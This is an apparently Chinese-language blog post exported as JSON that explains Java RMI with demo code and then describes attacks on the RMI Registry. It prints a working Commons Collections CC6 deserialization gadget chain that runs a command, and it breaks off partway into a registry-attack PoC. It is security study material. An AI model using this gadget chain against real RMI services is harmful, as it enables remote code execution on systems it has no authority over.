{"title":"java-RMI总结","uid":"6005eed39119dccf7e919200eaee24eb","slug":"java-RMI总结","date":"2023-11-12T15:47:53.000Z","updated":"2023-11-12T15:48:12.906Z","comments":true,"path":"api/articles/java-RMI总结.json","keywords":null,"cover":[],"content":"<h1 id=\"RMI基础\"><a href=\"#RMI基础\" class=\"headerlink\" title=\"RMI基础\"></a>RMI基础</h1><h3 id=\"是什么？\"><a href=\"#是什么？\" class=\"headerlink\" title=\"是什么？\"></a>是什么？</h3><p>RMI是远程方法调用，是基于注册中心和服务来进行实现的，是非常类似于GO中的RPC，都可以用来做微服务。</p>\n<h3 id=\"如何用？\"><a href=\"#如何用？\" class=\"headerlink\" title=\"如何用？\"></a>如何用？</h3><ul>\n<li>定义接口继承<code>Remote</code> 其中的方法都需要<code>throws RemoteException</code></li>\n<li>实现类继承<code>UnicastRemoteObject</code>类实现接口方法</li>\n</ul>\n<h5 id=\"问题1：必须throws-RemoteException嘛？换句话说throws其他的Exceptions类型是否可以？\"><a href=\"#问题1：必须throws-RemoteException嘛？换句话说throws其他的Exceptions类型是否可以？\" class=\"headerlink\" title=\"问题1：必须throws RemoteException嘛？换句话说throws其他的Exceptions类型是否可以？\"></a>问题1：必须throws RemoteException嘛？换句话说throws其他的Exceptions类型是否可以？</h5><p>可以是RmoeteException的父类和超类。（其实可以理解为父类可以转成子类）</p>\n<h3 id=\"实现Demo：\"><a href=\"#实现Demo：\" class=\"headerlink\" title=\"实现Demo：\"></a>实现Demo：</h3><h4 id=\"接口：\"><a href=\"#接口：\" class=\"headerlink\" title=\"接口：\"></a>接口：</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>javarmi</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">RemoteObj</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Remote</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token class-name\">SayHello</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> key<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">RemoteException</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token class-name\">SayHello1</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> key<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>IOException</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"实现类：\"><a href=\"#实现类：\" class=\"headerlink\" title=\"实现类：\"></a>实现类：</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>javarmi</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>study<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">CC6</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RemoteException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">UnicastRemoteObject</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ServerObj</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">UnicastRemoteObject</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">RemoteObj</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">ServerObj</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">RemoteException</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token class-name\">SayHello</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> key<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">RemoteException</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Hello \"</span> <span class=\"token operator\">+</span> key<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token class-name\">SayHello1</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> key<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>IOException</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"服务端：\"><a href=\"#服务端：\" class=\"headerlink\" title=\"服务端：\"></a>服务端：</h4><ul>\n<li>实例化实现接口类</li>\n<li>创建注册中心</li>\n<li>将实现类绑定到注册中心中</li>\n</ul>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>javarmi</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">sun<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>registry<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RegistryImpl_Skel</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AlreadyBoundException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RemoteException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>registry<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LocateRegistry</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>registry<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Registry</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Server</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">RemoteException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">AlreadyBoundException</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">ServerObj</span> serverObj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServerObj</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Registry</span> registry <span class=\"token operator\">=</span> <span class=\"token class-name\">LocateRegistry</span><span class=\"token punctuation\">.</span><span class=\"token function\">createRegistry</span><span class=\"token punctuation\">(</span><span class=\"token number\">7891</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        registry<span class=\"token punctuation\">.</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sayHello\"</span><span class=\"token punctuation\">,</span> serverObj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"客户端：\"><a href=\"#客户端：\" class=\"headerlink\" title=\"客户端：\"></a>客户端：</h4><ul>\n<li>获取注册中心</li>\n<li>获取绑定的类</li>\n<li>调用绑定类的方法</li>\n</ul>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>javarmi</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>registry<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LocateRegistry</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span>registry<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Registry</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Client</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Registry</span> registry <span class=\"token operator\">=</span> <span class=\"token class-name\">LocateRegistry</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRegistry</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7891</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">RemoteObj</span> remoteObj <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">RemoteObj</span><span class=\"token punctuation\">)</span> registry<span class=\"token punctuation\">.</span><span class=\"token function\">lookup</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"server\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\"><span class=\"token namespace\">remoteObj<span class=\"token punctuation\">.</span></span>SayHello</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"123\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"RMI流程：\"><a href=\"#RMI流程：\" class=\"headerlink\" title=\"RMI流程：\"></a>RMI流程：</h4><p>RMI Server 将接口实现类注册到RMI Registry去，当RMI Client需要调用远程对象的时候，先去RMI Registry中进行查找，查看RMI Registry中是否有所需的对象，如果有的话，RMI Client连接RMI Server，将参数发送过去然后RMI Server执行完之后，将结果返回。</p>\n<h2 id=\"攻击方法：\"><a href=\"#攻击方法：\" class=\"headerlink\" title=\"攻击方法：\"></a>攻击方法：</h2><p>后续用到的恶意类</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>study</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Transformer</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ChainedTransformer</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ConstantTransformer</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvokerTransformer</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>keyvalue<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TiedMapEntry</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LazyMap</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LinkedHashMap</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CC6</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">CC6</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"open -a Calculator\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">LinkedHashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> linkedHashMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LinkedHashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">ChainedTransformer</span> fakeTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">LazyMap</span> lazyMap <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>linkedHashMap<span class=\"token punctuation\">,</span> fakeTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">TiedMapEntry</span> tiedMapEntry <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TiedMapEntry</span><span class=\"token punctuation\">(</span>lazyMap<span class=\"token punctuation\">,</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        hashMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>tiedMapEntry<span class=\"token punctuation\">,</span> <span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">></span></span> aClass <span class=\"token operator\">=</span> fakeTransformer<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Field</span> iTransformers <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"iTransformers\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        iTransformers<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        iTransformers<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>fakeTransformer<span class=\"token punctuation\">,</span> transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        linkedHashMap<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> hashMap<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        SerAndUnSer.Serialize(hashMap);</span>\n<span class=\"token comment\">//        return SerAndUnSer.UnSerialize();</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"打RMI-Registry\"><a href=\"#打RMI-Registry\" class=\"headerlink\" title=\"打RMI Registry\"></a>打RMI Registry</h3><h4 id=\"原理：\"><a href=\"#原理：\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>RMI Client会向RMI Registry中进行查询，涉及到序列化和反序列化的问题</p>\n<h4 id=\"条件：\"><a href=\"#条件：\" class=\"headerlink\" title=\"条件：\"></a>条件：</h4><ul>\n<li>注册中心（服务端）有恶意的依赖。</li>\n</ul>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699085999406-4c335ad7-20fd-4acf-8aff-8ed7255059fe-20231112234407299.png\" alt=\"img\"></p>\n<p>最后会调用到dispatch方法</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token number\">0</span> —– bind\n<span class=\"token number\">1</span> —– list\n<span class=\"token number\">2</span> —– lookup\n<span class=\"token number\">3</span> —– rebind\n<span class=\"token number\">4</span> —– unbind<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里除了list的时候会进行writeObject，其他都会进行反序列化，我们先看看，客户端进行了哪些操作。<code>Registry_stub.class</code>中对应着四种方法，这里看bind或者其他都可以。以bind为例子。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">bind</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Remote</span> obj<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">RemoteException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">AlreadyBoundException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">AccessException</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h6 id=\"客户端：-1\"><a href=\"#客户端：-1\" class=\"headerlink\" title=\"客户端：\"></a>客户端：</h6><p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699086173378-0db2607c-c813-4c0f-97c0-7c096204cf47-20231112234407335.png\" alt=\"img\"></p>\n<h6 id=\"服务端：-1\"><a href=\"#服务端：-1\" class=\"headerlink\" title=\"服务端：\"></a>服务端：</h6><p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699086277064-21a3c4ea-aa4b-4513-a8ad-a1aa91e90bf2-20231112234407350.png\" alt=\"img\"></p>\n<p>很多都是以CC为例子，这里我们可以扩大到任意恶意为例，我们模拟bind来进行发送数据包。</p>\n<h5 id=\"poc：\"><a href=\"#poc：\" class=\"headerlink\" title=\"poc：\"></a>poc：</h5><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>javarmi<span class=\"token punctuation\">.</span>attackRegistry</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>study<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">CC6</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutput</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RemoteException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> 